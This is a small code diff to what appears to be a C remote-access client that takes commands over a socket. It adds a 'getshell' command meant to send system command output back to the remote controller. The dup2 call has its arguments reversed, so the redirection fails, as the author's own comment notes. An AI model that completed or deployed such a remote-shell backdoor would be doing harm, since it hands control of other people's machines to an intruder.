@@ -23,7 +23,15 @@ int main() // Program's entry point.
 			printf("Command: %s\n", recv_data); // For debugging.
 
 			if (strcmp(recv_data, "sysinfo") == 0) {
+
 				send_data(socket_fd, get_system_info());
+
+			} else if (strcmp(recv_data, "getshell") == 0) { 
+				
+				int r;
+				int result = dup2(1, socket_fd);
+				r = system("ls -l"); // Will print results to the terminal, we want it to print the results to the socket.
+
 			}
 			
 		}
